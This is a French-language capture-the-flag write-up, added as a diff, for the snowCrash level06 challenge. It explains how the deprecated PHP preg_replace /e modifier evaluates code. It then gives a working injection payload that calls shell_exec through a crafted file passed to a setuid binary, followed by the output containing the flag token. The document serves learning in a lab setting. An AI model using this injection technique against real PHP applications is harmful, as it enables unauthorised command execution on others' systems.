@@ -1,0 +1,35 @@
+FLAG 06 :
+
+    Ici on se retrouve avec un fichier php et un binaire.
+
+    En éxécutant le binaire on comprend qu'il execute le fichier php.
+
+    On trouve cependant rien de tres interéssant dans celui ci.
+
+    Je decide de copier le contenue du fichier php et le coller dans un fichier en dehors de la vm afin de le tester.
+
+    Et la on découvre quelque chose d'intéressant :
+
+    `Warning: preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead
+    in /Users/jamerlin/Projects/snowCrash/level06.php on line 12`
+
+    Apparemment le `/e` de la regex n'est plus supportée sur la nouvelle version de php.
+
+    On vas aller regarder pourquoi et on nous explique que le /e permettais d'executer du code php dans une expression
+
+    régulière en executant la fonction eval() et cela constituais une vulnérabilité.
+
+    On vas donc regarder un exemple d'exploitation pour comprendre comment cela fonctionne.
+
+    Apres pas mal de recherche et d'essai on arrive enfin a créer le fichier attendu :
+
+    `echo '[x {${shell_exec('getflag')}}]' > /tmp/regex.php`
+
+    et on execute ensuite `./level06 /tmp/regex.php`.
+
+    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) :
+    regexp code on line 1
+    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+        in /home/user/level06/level06.php(4) : regexp code on line 1
+
+    On récupère le token entre les erreur php.
